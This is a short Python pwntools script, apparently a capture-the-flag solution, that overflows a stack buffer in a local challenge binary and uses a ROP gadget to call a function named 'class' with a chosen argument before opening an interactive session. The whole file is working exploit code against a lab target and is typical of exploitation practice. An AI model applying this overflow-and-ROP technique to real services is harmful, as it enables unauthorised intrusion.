from pwn import *

context.binary = e = ELF("./app/chall")
# p = process("./chall")
p = remote("localhost", 21234)

# relevant gadgets found via `ROPgadget --binary ./chall`
# 0x00000000004014f4 : pop rdi ; nop ; pop rbp ; ret
pop_rdi_rbp = 0x4014f4

# relevant functions found via `nm chall`
# 0000000000401371 T class
class_ = 0x401371

payload  = b"A"*520
payload += p64(pop_rdi_rbp)
payload += p64(0x13371337)  # pop rdi value
payload += p64(0)           # pop rbp value
payload += p64(class_)      # return address

p.sendlineafter(b">", payload)

p.interactive()
